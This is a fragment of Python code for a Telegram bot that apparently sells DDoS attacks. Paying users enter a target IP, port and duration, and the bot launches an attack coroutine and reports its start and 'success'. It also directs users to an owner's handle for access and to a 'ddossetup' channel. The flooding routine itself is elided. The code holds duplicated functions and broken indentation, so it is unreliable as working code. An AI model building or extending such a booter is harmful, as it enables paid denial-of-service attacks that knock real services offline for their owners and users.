...
def attack_command(message):
    ...
    try:
        ...
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "𝘼𝙘𝙘𝙚𝙨𝙨 𝙙𝙚𝙣𝙞𝙚𝙙\n𝙔𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤𝙩 𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙 𝙩𝙤 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩\n𝙠𝙞𝙣𝙙𝙡𝙮 𝘿𝙢👉@PRO_GAMER_VIP_OWNER 𝙏𝙤 𝙂𝙚𝙩 𝘼𝙘𝙘𝙚𝙨𝙨.")
            return
...
def attack_command(message):
    ...
    try:
        user_data = users_collection.find_one({"user_id": user_id})
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "*𝘼𝙘𝙘𝙚𝙨𝙨 𝙙𝙚𝙣𝙞𝙚𝙙\n𝙔𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤𝙩 𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙 𝙩𝙤 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩\n𝙠𝙞𝙣𝙙𝙡𝙮 𝘿𝙢👉@PRO_GAMER_VIP_OWNER 𝙏𝙤 𝙂𝙚𝙩 𝘼𝙘𝙘𝙚𝙨𝙨.*", parse_mode='Markdown')
            return
        ...
        bot.send_message(chat_id, "**Enter the target IP, port, and duration (in seconds) separated by spaces.\n𝙀𝙭𝙖𝙢𝙥𝙡𝙚👉 210.148.85.32 17870 180**", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_attack_command)
    except Exception as e:
        logging.error(f"Error in attack command: {e}")
...
def process_attack_command(message):
    try:
        ...
        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*Port {target_port} is blocked. Please use a different port.\nTHIS SUM PORT ARE BLOCKED 8700, 20000, 443, 17500, 9031, 20002, 20001*", parse_mode='Markdown')
            return

        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
        bot.send_message(message.chat.id, f"*🚀𝘼𝙩𝙩𝙖𝙘𝙠 𝙨𝙩𝙖𝙧𝙩𝙚𝙙 𝙤𝙣🔫\n\n🎯𝙄𝙋: {target_ip}\n🏖️𝙋𝙤𝙧𝙩: {target_port}\n⌚𝙏𝙞𝙢𝙚: {duration}𝙨𝙚𝙘.*", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")
        
     threading.Timer(int(duration) + 1, lambda: bot.send_message(message.chat.id, f"*🚀𝘼𝙩𝙩𝙖𝙘𝙠 𝙤𝙣 ☄️{target_ip}\n\n🏖️𝙋𝙤𝙧𝙩:{target_port}\n🎉𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚𝙙 🎊𝙎𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮🥳*", parse_mode='Markdown')).start()
    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")
...
def handle_message(message):
    if message.text == "🚀ATTACK":
        ...
        bot.reply_to(message, "*https://t.me/ddossetup/13*", parse_mode='Markdown')
